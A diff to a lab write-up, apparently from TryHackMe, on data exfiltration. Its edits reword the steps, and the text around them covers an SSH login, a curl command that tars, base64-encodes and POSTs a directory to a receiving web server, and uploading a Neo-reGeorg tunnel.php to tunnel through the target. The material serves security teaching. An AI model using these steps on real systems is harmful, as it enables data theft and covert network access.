@@ -212,14 +212,14 @@ if (isset($_POST['file'])) {
 
 The above PHP script will handle POST requests via the `file` parameter and store the received data in the `/tmp` directory as `http.bs64`.
 
-1. Now, from the JumpBox machine, we can connect via SSH to `victim1.thm.com`:
+1. Now, from the Jumpbox machine, we can connect via SSH to `victim1.thm.com`:
 
     ```shell
     ssh thm@victim1.thm.com
     # password: tryhackme
     ```
 
-2. Our goal is to transfer the `/home/thm/task6`'s content:
+2. Our goal is to transfer the `/home/thm/task6`'s content from `victim1.thm.com` to the `web.thm.com` server:
 
     ```shell
     curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
@@ -283,21 +283,21 @@ In our network configuration, the `uploader.thm.com` server is reachable from th
     git clone https://github.com/L-codes/Neo-reGeorg
     ```
 
-2. Next, we need to generate an encrypted client file to upload it to the target web server:
+2. Next, we need to generate an encrypted client file and upload it to the target web server:
 
     ```shell
     python3 neoreg.py generate -k thm
     ```
 
-    The above command generates an encrypted tunneling clients with `thm` as their key under the `neoreg_servers/` directory. Various file extensions are available, but we will use the `tunnel.php` file for this one.
+    The above command generates encrypted tunneling clients, using `thm` as their key, under the `neoreg_servers/` directory. Various file extensions are available, but we will use the `tunnel.php` file for this one.
 
     ![tunnel client list](neoreg-servers.png)
 
-3. Now, we need to upload our client at the `uploader.thm.com` server. We can visit it via our browser at http://10.10.19.86/uploader. To upload the `tunnel.php` we must use "admin" as the key.
+3. Now, we need to upload our encrypted tunneling client file at the `uploader.thm.com` server, which we can visit via our browser at [http://10.10.19.86/uploader](http://10.10.19.86/uploader). To upload the `tunnel.php` we must use "admin" as the key.
 
     ![Tunnel Upload](tunnel-upload.jpg)
 
-4. Once the file is uploaded, we will point to it using the `neoreg.py` script in order to connect to the client, providing the key to decrypt the tunneling client:
+4. Once the file is uploaded, we will point to it using the `neoreg.py` script using our defined key, `thm`, in order to first decrypt the client file, and then connect to it:
 
     ```shell
     python3 neoreg.py -k thm http://10.10.19.86/uploader/files/tunnel.php
